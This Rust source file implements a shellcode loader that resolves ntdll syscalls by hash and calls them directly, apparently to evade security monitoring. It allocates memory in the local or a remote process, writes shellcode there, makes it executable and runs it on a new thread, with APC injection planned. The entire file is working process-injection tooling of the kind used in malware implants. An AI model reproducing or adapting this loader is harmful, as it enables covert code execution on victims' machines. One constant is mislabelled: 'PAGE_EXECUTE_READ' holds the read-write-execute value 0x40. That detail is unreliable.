use alloc::vec::Vec;
use anyhow::anyhow;
use anyhow::Result;
use common::hashing::traits::HashFunction;
use common::syscall::hell::{
    set_syscall, syscall_1, syscall_11, syscall_3, syscall_5, syscall_6,
};
use common::syscall::resolver::{SyscallMap, WinDll};
use common::util::move_memory;
use core::ffi::c_void;
use core::fmt::Debug;
use core::hash::Hash;
use core::mem::transmute;
use core::ptr::{null, null_mut};
use libc_print::std_name::println;

const MEM_RESERVE: u32 = 8192;
const MEM_COMMIT: u32 = 4096;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x40;
const THREAD_ALL_ACCESS: u32 = 0x1FFFFF;

// #[repr(C)]
pub struct Loader<T, H>
where
    T: Sized + Eq + Hash + Copy,
    H: HashFunction<Output = T>,
{
    hashes: Vec<T>,
    process: *mut c_void,
    caller_table: SyscallMap<T, H>,
    allocation: Option<*mut c_void>,
}

impl<T: Eq + Hash + Copy + Debug, H: HashFunction<Output = T> + Clone> Loader<T, H> {
    pub fn new(mut hashes: Vec<T>, process: Option<*mut c_void>, hash_func: H) -> Self {
        let proc: *mut c_void;

        if let Some(process_ptr) = process {
            proc = process_ptr;
        } else {
            proc = (!0isize) as *mut c_void;
        }

        let hash_fn_clone = hash_func.clone();
        let caller_table = SyscallMap::new(hashes.as_mut_slice(), hash_fn_clone, WinDll::Ntdll);

        Self {
            hashes,
            process: proc,
            caller_table,
            allocation: None,
        }
    }

    pub fn inject_remote(&mut self, shellcode: &[u8]) -> Result<()> {
        let mut bytes_written = 0usize;
        let mut initial_protect: u32 = PAGE_READWRITE;
        let mut base_address = null_mut::<c_void>();
        let mut buffer_size = shellcode.len();

        let mut ntstatus: i32;

        match self.caller_table.resolve(0) {
            Ok(syscall) => {
                let args: [u64; 6] = unsafe {
                    [
                        self.process as u64,
                        transmute(&base_address),
                        null::<c_void>() as u64,
                        transmute(&mut buffer_size),
                        (MEM_RESERVE | MEM_COMMIT) as u64,
                        initial_protect as u64,
                    ]
                };

                set_syscall(syscall.ssn, syscall.random as u64);

                ntstatus = unsafe { syscall_6(args.as_ptr()) };
                if ntstatus != 0x0 || base_address.is_null() {
                    Err(anyhow!("NtAllocateVirtualMemory failed with NTSTATUS 0x{:08X?}",
                        ntstatus
                    ))?
                }
            }

            _ => Err(anyhow!("Hash (call 0) not found"))?
        }

        // println!("+ \tNtAllocateVirtualMemory OK (allocation base: {:016x?})\n", base_address);

        match self.caller_table.resolve(5) {
            Ok(syscall) => {
                let args: [u64; 5] = unsafe {
                    [
                        self.process as u64,
                        base_address as u64,
                        transmute(&shellcode),
                        shellcode.len() as u64,
                        transmute(&mut bytes_written),
                    ]
                };

                set_syscall(syscall.ssn, syscall.random as u64);

                ntstatus = unsafe { syscall_5(args.as_ptr()) };
                if ntstatus != 0x0 {
                    println!("wrote {} of {} bytes before failure:", bytes_written, &buffer_size);
                    Err(anyhow!("NtWriteVirtualMemory failed with NTSTATUS 0x{:08X?}",
                        ntstatus,
                    ))?
                }
            }
            _ => Err(anyhow!("Hash (call 1) not found"))?
        }

        match self.caller_table.resolve(1) {
            Ok(syscall) => {
                let args: [u64; 6] = unsafe {
                    [
                        self.process as u64,
                        transmute(&mut base_address),
                        transmute(&shellcode.len()),
                        PAGE_EXECUTE_READ as u64,
                        transmute(&mut initial_protect),
                        null::<c_void>() as u64,
                    ]
                };


                set_syscall(syscall.ssn, syscall.random as u64);

                unsafe { ntstatus = syscall_5(args.as_ptr()) }
                if ntstatus != 0x0 {
                    Err(anyhow!("NtProtectVirtualMemory failed with NTSTATUS 0x{:08X?}", ntstatus))?
                }
            }

            _ => Err(anyhow!("Hash (call 2) not found"))?
        }

        // persist the allocated base address before we forget
        self.allocation = Some(base_address);

        Ok(())
    }

    /// Assumes `self.hashes` contains the following hashes in this order (zero-indexed):
    ///
    /// 0. `NtAllocateVirtualMemory`,
    /// 1. `NtProtectVirtualMemory`,
    pub fn inject_local(&mut self, shellcode: &[u8]) -> Result<()> {
        let mut initial_protect = PAGE_READWRITE;
        let mut base_address = null_mut::<c_void>();
        let mut buffer_size = shellcode.len();
        let mut ntstatus;

        match self.caller_table.resolve(0) {
            Ok(syscall) => {
                let args: [u64; 6] = unsafe {
                    [
                        self.process as u64,
                        transmute(&mut base_address),
                        null::<c_void>() as u64,
                        transmute(&mut buffer_size),
                        (MEM_RESERVE | MEM_COMMIT) as u64,
                        initial_protect as u64,
                    ]
                };

                set_syscall(syscall.ssn, syscall.random as u64);

                unsafe { ntstatus = syscall_6(args.as_ptr()) }
                if ntstatus != 0x0 {
                    Err(
                        anyhow!("NtAllocateVirtualMemory failed with NTSTATUS 0x{:08X?}", ntstatus)
                    )?
                }
            }

            _ => Err(anyhow!("Hash not found"))?
        }

        unsafe {
            _ = move_memory(
                base_address,
                shellcode.as_ptr() as *const c_void,
                shellcode.len(),
            );
        }

        match self.caller_table.resolve(1) {
            Ok(syscall) => {
                let args: [u64; 5] = unsafe {
                    [
                        self.process as u64,
                        transmute(&mut base_address),
                        transmute(&mut buffer_size),
                        PAGE_EXECUTE_READ as u64,
                        transmute(&mut initial_protect),
                    ]
                };

                set_syscall(syscall.ssn, syscall.random as u64);
                unsafe { ntstatus = syscall_5(args.as_ptr()) }
                if ntstatus != 0x0 {
                    Err(
                        anyhow!("NtProtectVirtualMemory failed with NTSTATUS 0x{:08X?}", ntstatus)
                    )?
                }
            }

            _ => Err(anyhow!("Hash not found"))?
        }

        self.allocation = Some(base_address);

        Ok(())
    }

    /// Assumes `self.hashes` contains hashes in this order (zero-indexed):
    ///
    /// 2. `NtCreateThread`
    /// 3. `NtWaitForSingleObject`
    /// 4. `NtClose`
    pub fn run_thread(&mut self, wait_time: Option<usize>) -> Result<()> {
        let mut ntstatus;
        let mut thread_handle: *mut c_void = null_mut();

        match self.caller_table.resolve(2) {
            Ok(syscall) => {
                let thread_entry: extern "system" fn(*mut c_void) -> u32 =
                    unsafe { transmute(self.allocation.unwrap()) };

                let args: [u64; 11] = unsafe {
                    [
                        
                        transmute(&mut thread_handle),
                        THREAD_ALL_ACCESS as u64,
                        null::<c_void>() as u64,
                        self.process as u64,
                        thread_entry as u64,
                        null::<c_void>() as u64,
                        null::<c_void>() as u64,
                        null::<c_void>() as u64,
                        null::<c_void>() as u64,
                        null::<c_void>() as u64,
                        null::<c_void>() as u64,
                    ]
                };

                set_syscall(syscall.ssn, syscall.random as u64);
                unsafe { ntstatus = syscall_11(args.as_ptr()) }
                if ntstatus != 0x0 {
                    Err(
                        anyhow!("NtCreateThread failed with NTSTATUS 0x{:08X?}", ntstatus)
                    )?
                }
            }

            _ => Err(anyhow!("Hash not found"))?
        }

        match self.caller_table.resolve(3) {
            Ok(syscall) => {
                let wait = wait_time.unwrap_or(0x00);
                let args: [u64; 3] = [unsafe { transmute(thread_handle) }, 0x00, wait as u64];

                set_syscall(syscall.ssn, syscall.random as u64);
                unsafe { ntstatus = syscall_3(args.as_ptr()) };
                if ntstatus != 0x0 {
                    Err(
                        anyhow!("NtWaitForSingleObject failed with NTSTATUS 0x{:08X?}", ntstatus)
                    )?
                }
            }

            _ => Err(anyhow!("Hash not found"))?
        }

        if !thread_handle.is_null() {
            match self.caller_table.resolve(4) {
                Ok(syscall) => {
                    set_syscall(syscall.ssn, syscall.random as u64);
                    let ntstatus = unsafe { syscall_1(transmute(thread_handle)) };
                    if ntstatus != 0x0 {
                        Err(anyhow!("NtClose failed with NTSTATUS 0x{:08X?}", ntstatus))?
                    }
                }

                _ => Err(anyhow!("Hash not found"))?
            }
        }

        Ok(())
    }

    // TODO: implement NtQueueApcThread injection
    //  (needs to be from suspended thread).
    // pub fn queue_apc_thread() // ...
}
